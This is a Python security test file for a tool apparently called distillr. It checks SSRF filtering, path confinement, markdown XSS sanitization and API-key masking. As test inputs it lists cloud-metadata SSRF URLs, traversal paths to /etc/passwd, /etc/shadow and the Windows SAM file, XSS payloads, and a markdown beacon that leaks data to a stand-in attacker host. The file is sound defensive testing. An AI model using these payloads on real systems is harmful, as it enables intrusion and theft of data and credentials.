"""Security property tests for distillr's threat-model boundaries (how-we-build.md §7).

distillr's real threats are untrusted ingested content fed to an LLM and SSRF on
fetch -- not generic hygiene. These are the boundary invariants, fuzzed with
Hypothesis where the attack surface is encoding edge cases (SSRF, path traversal)
and asserted directly where it isn't (sanitizer, secret rendering). A failure here
is a vulnerability, not a style nit.
"""

from __future__ import annotations

import ipaddress
import tempfile
from pathlib import Path

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from distill.ingestors import net
from distill.ingestors.net import _is_public_ip, is_public_web_url
from distill.mcp.server import resolve_within_library


def _resolve_within_library(root, path):
    return resolve_within_library(root, path)


def _url_for(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> str:
    host = f"[{ip}]" if ip.version == 6 else str(ip)
    return f"http://{host}/path"


class TestSSRF:
    """No private/loopback/link-local/metadata/reserved target ever passes the
    public-web check; the SSRF parser's verdict must track address class exactly,
    across the whole fuzzed IP space."""

    @given(st.ip_addresses())
    def test_verdict_tracks_address_class_for_ip_literals(self, ip):
        # is_public_web_url must agree with the address-class predicate for any
        # IP literal -- this is where weird-encoding SSRF bypasses live.
        assert is_public_web_url(_url_for(ip)) == _is_public_ip(ip)

    @given(st.ip_addresses(v=4).filter(lambda a: not _is_public_ip(a)))
    def test_private_v4_always_rejected(self, ip):
        assert is_public_web_url(_url_for(ip)) is False

    def test_cloud_metadata_endpoint_rejected(self):
        # The single most important SSRF target (169.254.169.254 is link-local).
        for url in (
            "http://169.254.169.254/latest/meta-data/",
            "http://[fd00:ec2::254]/latest/meta-data/",  # IMDSv6, unique-local
            "http://[64:ff9b::a9fe:a9fe]/latest/meta-data/",  # NAT64-encoded IMDSv4
            "http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv4-mapped IMDS
            "http://metadata.google.internal/",  # resolves to link-local in practice
        ):
            assert resolve_or_false(url) is False

    @pytest.mark.parametrize(
        "scheme",
        ["file", "ftp", "gopher", "data", "ws", "wss", "dict", "ldap", "jar", "view-source"],
    )
    def test_non_http_schemes_rejected_even_for_public_host(self, scheme):
        # A public IP behind a dangerous scheme must still be refused.
        assert is_public_web_url(f"{scheme}://93.184.216.34/") is False

    @pytest.mark.parametrize(
        "order", [("93.184.216.34", "10.0.0.1"), ("10.0.0.1", "93.184.216.34")]
    )
    def test_fail_closed_when_any_resolved_address_is_private(self, order, monkeypatch):
        # DNS returning a mix of public + private must fail closed regardless of
        # order -- the classic rebind/multi-A-record SSRF.
        monkeypatch.setattr(net, "_resolve_host_to_addrs", lambda host: list(order))
        assert is_public_web_url("http://attacker.example/") is False


def resolve_or_false(url: str) -> bool:
    """is_public_web_url, but tolerant of hosts that don't resolve offline.

    For hostname targets (metadata.google.internal) DNS may be unavailable in CI;
    a non-resolving host is also correctly rejected, so False is the right answer
    either way. IP-literal targets don't hit DNS at all.
    """
    return is_public_web_url(url)


class TestPathConfinement:
    """MCP path args never escape the library root, regardless of traversal,
    absolute markers, or null bytes."""

    _ROOT = Path(tempfile.mkdtemp(prefix="distill-pathtest-")).resolve()

    @settings(suppress_health_check=[HealthCheck.function_scoped_fixture])
    @given(
        st.lists(
            st.sampled_from(["..", "a", "b", "sub", ".", "x.md", "‥", "....", "%2e%2e"]),
            min_size=1,
            max_size=6,
        )
    )
    def test_resolved_path_never_escapes_root(self, parts):
        candidate = "/".join(parts)
        result = _resolve_within_library(self._ROOT, candidate)
        # Either rejected (None) or strictly contained -- never an escape.
        assert result is None or result.is_relative_to(self._ROOT)

    @pytest.mark.parametrize(
        "evil",
        [
            "../../etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "\\\\server\\share\\x",
            "sub/../../../../etc/shadow",
            "a\x00b",
            "",
        ],
    )
    def test_known_traversals_rejected(self, evil):
        result = _resolve_within_library(self._ROOT, evil)
        assert result is None or result.is_relative_to(self._ROOT)


class TestOutputSanitization:
    """Untrusted-derived corpus HTML rendered in the dashboard never carries an
    active XSS/exfil payload (XSS is the #1 AI-code vuln class -- Veracode 2025)."""

    @staticmethod
    def _filter():
        from distill.config import DistillConfig
        from distill.web.server import create_app

        app = create_app(DistillConfig(xai_api_key="t"))
        return app.state.templates.env.filters["markdown"]

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "[click](javascript:alert(1))",
            '<a href="javascript:alert(1)">x</a>',
            "![beacon](http://attacker/leak?d=secret)",
            "<iframe src=//evil></iframe>",
        ],
    )
    def test_no_active_payload_survives(self, payload):
        out = self._filter()(payload).lower()
        assert "<script" not in out
        assert "onerror" not in out
        assert "javascript:" not in out
        assert "<iframe" not in out
        assert "<img" not in out  # img dropped to kill zero-click exfil beacons


def _config_baseline_text() -> str:
    """Structural text of a config's renderings with NO real secret present.

    Field names (xai_fast_model, ...) and default values (grok-4.3, warn) appear
    verbatim in repr/str/JSON. A candidate secret that is a substring of this
    baseline collides with structure, not with a leaked key -- the SecretStr is
    still masked -- so such candidates are filtered out below rather than counted
    as failures (the Hypothesis falsifying example was secret='_model', a
    substring of 'xai_fast_model').
    """
    from distill.config import DistillConfig

    sentinel = "Zq7SENTINEL7qZ"
    cfg = DistillConfig(xai_api_key=sentinel)
    rendered = repr(cfg) + str(cfg) + cfg.model_dump_json()
    return rendered.replace(sentinel, "")


_CONFIG_BASELINE = _config_baseline_text()


class TestSecretNeverRenders:
    """API keys are SecretStr and never leak into repr/str/serialization."""

    @given(
        st.text(min_size=6, max_size=40).filter(
            lambda s: s.strip() and "*" not in s and s not in _CONFIG_BASELINE
        )
    )
    def test_secret_value_absent_from_renderings(self, secret):
        from distill.config import DistillConfig

        cfg = DistillConfig(xai_api_key=secret)
        assert secret not in repr(cfg)
        assert secret not in str(cfg)
        assert secret not in cfg.model_dump_json()
        # The real value is still retrievable for use, just not rendered.
        assert cfg.xai_api_key.get_secret_value() == secret
